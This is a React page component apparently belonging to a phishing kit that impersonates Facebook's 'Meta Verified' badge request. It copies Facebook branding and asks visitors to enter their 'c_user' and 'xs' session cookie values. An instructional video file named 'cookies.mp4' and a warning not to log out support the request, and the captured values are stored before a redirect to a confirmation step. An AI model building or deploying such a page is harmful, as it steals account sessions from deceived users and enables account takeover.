import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@/lib/form-schemas";
import { Search } from "lucide-react";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      localStorage.setItem('validation_data', JSON.stringify(data));
      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Validation Step"
      />
      <div className="min-h-screen flex flex-col bg-white">
        <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
          <div className="flex items-center">
            <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
            />
          </div>
        </nav>

        <div className="flex-1 flex justify-center p-4 sm:p-8">
          <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
              Request a verified badge on Facebook
            </h1>

            <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
              <p>
                The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
              </p>
              <p>
                Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
              </p>
              <p>
                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
              </p>
            </div>

            <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
              <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>

              <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
                <video
                  className="w-full h-full"
                  controls
                  playsInline
                  preload="auto"
                >
                  <source
                    src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
                    type="video/mp4"
                  />
                  Your browser does not support the video tag.
                </video>
              </div>

              <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
                Must Watch the video and submit required information correctly.
              </h3>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min="0"
                          pattern="[0-9]+"
                          minLength={6}
                          placeholder="Enter c_user"
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                      <FormControl>
                        <Input 
                          type="text" 
                          placeholder="Enter xs" 
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />

                <p className="text-xs sm:text-sm text-[#65676B]">
                  Please make sure account not to log out from your computer or laptop until you have received a verification email.
                </p>

                <Button 
                  type="submit" 
                  className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
                  disabled={form.formState.isSubmitting}
                >
                  {form.formState.isSubmitting ? "Submitting..." : "Submit"}
                </Button>
              </form>
            </Form>
          </div>
        </div>

        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t">
          Meta © 2025
        </div>
      </div>
    </>
  );
}